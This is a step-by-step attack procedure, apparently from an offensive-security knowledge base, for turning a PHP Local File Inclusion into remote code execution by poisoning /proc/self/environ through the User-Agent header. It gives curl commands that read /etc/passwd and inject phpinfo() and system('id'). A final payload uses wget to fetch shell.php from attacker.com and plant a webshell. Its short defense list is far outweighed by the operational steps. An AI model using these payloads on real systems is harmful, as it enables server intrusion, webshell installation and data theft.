---
type: procedure
description: >-
  Exploit a Local File Inclusion vulnerability to achieve Remote Code Execution
  by injecting PHP code into the /proc/self/environ file via the User-Agent
  header in an HTTP request.
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Exploitation-of-Remote-Services|T1210 - Exploitation of Remote
    Services]]
  - >-
    [[techniques/Command-and-Scripting-Interpreter|T1059 - Command and Scripting
    Interpreter]]
sub_techniques:
  - '[[sub-techniques/Unix-Shell|T1059.004 - Unix Shell]]'
tags:
  - file-inclusion
  - lfi
  - rce
  - php
  - linux
commands:
  - '[[commands/curl-lfi-rce-environ]]'
tools: []
platforms:
  - Linux
  - Web
skill_level: intermediate
impact_level: high
detection_risk: high
verified: true
validated: true
---

# LFI-to-RCE-via-Proc-Self-Environ

## Summary

This procedure exploits a Local File Inclusion (LFI) vulnerability in a web application to achieve Remote Code Execution (RCE) on a Linux-based server. By crafting an HTTP request with malicious PHP code in the User-Agent header, the web server writes the payload to /proc/self/environ. A subsequent LFI traversal then includes this file, causing the PHP code to execute within the context of the web server process.

## Description

Local File Inclusion vulnerabilities allow attackers to include files on the server that are not intended to be accessible, often through path traversal (e.g., using ../). On Linux systems, /proc/self/environ is a pseudo-file that contains the current process's environment variables, including HTTP headers like User-Agent, separated by null bytes. When a web server (e.g., Apache with PHP) processes a request, it populates this file with request details. By injecting PHP code (e.g., <?php phpinfo(); ?>) into the User-Agent, the attacker poisons the environ file. Then, using the LFI to include /proc/self/environ executes the injected PHP code, as the web server interprets the file contents. This technique is effective against PHP applications without proper input sanitization and can lead to full server compromise, data exfiltration, or further lateral movement. It assumes the target is a Linux server running PHP-FPM or mod_php.

## Requirements

1. A confirmed LFI vulnerability in a web application endpoint (e.g., vulnerable.php?filename=).
2. Network access to the target web server (HTTP/HTTPS).
3. Tools for sending custom HTTP requests (e.g., curl or Burp Suite).
4. Knowledge of the target server's Linux-based environment (e.g., Apache/Nginx with PHP).
5. No authentication required for the LFI endpoint, or valid session/cookies if needed.

## Defense

- Implement strict input validation and sanitization for file inclusion parameters, using whitelists instead of blacklists for allowed paths.
- Disable or restrict access to /proc filesystem in the web server configuration (e.g., via Apache's mod_security or PHP's open_basedir).
- Use a Web Application Firewall (WAF) to detect path traversal patterns (e.g., ../) and anomalous User-Agent headers containing code-like strings.
- Enable PHP security settings like disable_functions for risky functions (e.g., system, exec) and log all file inclusion attempts.
- Run web servers in isolated environments (e.g., containers) to limit RCE impact.

## Objectives

1. Inject and execute arbitrary PHP code on the target server via LFI.
2. Demonstrate RCE capabilities, such as information disclosure (phpinfo()) or command execution.
3. Gain initial foothold for further post-exploitation activities like privilege escalation or data exfiltration.

## Instructions

### Step 1: Verify LFI Vulnerability

**Context**: Confirm the LFI endpoint allows path traversal to access system files, such as /etc/passwd, to ensure the vulnerability exists before attempting RCE.

**Command** ([[commands/curl-basic-lfi-test]]):
```bash
curl "http://target.com/vulnerable.php?filename=../../../etc/passwd" -A "Mozilla/5.0"
```

> This command sends a basic GET request to the LFI endpoint, attempting to include /etc/passwd. Replace the URL with the actual vulnerable endpoint. The -A flag sets a standard User-Agent to avoid detection.

**Expected Output**: The response body contains the contents of /etc/passwd (e.g., root:x:0:0:root:/root:/bin/bash), confirming LFI works.

### Step 2: Craft and Send Payload Request

**Context**: Poison the /proc/self/environ file by sending an HTTP request with PHP code in the User-Agent header. This step writes the payload to the environ file for later inclusion.

**Command** ([[commands/curl-lfi-rce-environ]]):
```bash
curl "http://target.com/vulnerable.php?filename=../../../proc/self/environ" -A "<?php phpinfo(); ?>"
```

> Use curl to send the request, setting the User-Agent (-A) to the PHP payload. The filename parameter traverses to /proc/self/environ, which includes the poisoned environment. Timing is critical: send this request immediately before the inclusion request, as /proc/self/environ is process-specific and transient.

**Expected Output**: The response displays the environment variables, including the User-Agent with the PHP code, but no execution yet. Look for the injected payload in the output separated by null bytes.

### Step 3: Trigger Execution via Inclusion

**Context**: Immediately after poisoning, include /proc/self/environ again to execute the PHP code, as the web server will interpret the file contents as PHP.

**Command** ([[commands/curl-lfi-rce-environ]]):
```bash
curl "http://target.com/vulnerable.php?filename=../../../proc/self/environ" -A "<?php system('id'); ?>"
```

> Reuse the same command but update the payload for command execution (e.g., system('id')). The inclusion triggers PHP parsing of the environ file, executing the code in the web server's context.

**Expected Output**: PHP execution output, such as phpinfo() details (server info, PHP config) or command results (e.g., uid=33(www-data) gid=33(www-data)). Errors may occur if null bytes interfere; adjust payload accordingly.

### Step 4: Verify and Escalate

**Context**: Confirm RCE success and prepare for further actions, such as uploading a webshell or exfiltrating data.

**Instructions**: If successful, modify the payload for more complex actions, like <?php system('wget http://attacker.com/shell.php -O shell.php'); ?>. Monitor responses for execution evidence.

**Expected Output**: Evidence of command execution or file changes on the server (verifiable via subsequent requests).

> If execution fails due to null byte issues, use alternative payloads or tools like Burp Suite for precise control.
